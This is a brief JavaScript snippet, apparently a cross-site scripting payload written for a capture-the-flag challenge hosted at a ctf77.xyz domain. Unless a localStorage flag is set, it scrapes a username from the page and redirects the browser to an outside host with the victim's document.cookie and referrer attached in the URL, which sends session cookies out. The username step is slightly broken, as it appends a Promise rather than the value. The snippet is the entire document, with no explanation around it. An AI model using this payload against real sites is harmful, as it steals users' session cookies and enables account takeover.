if (localStorage.abc !== '1') {
  const username = $.get('/').then(a => console.log(a.match(/profile\/(.+)"/)[1]));
  window.location = 'http://openbio.d.ctf77.xyz/redirect?' + document.cookie + document.referrer + username;
}
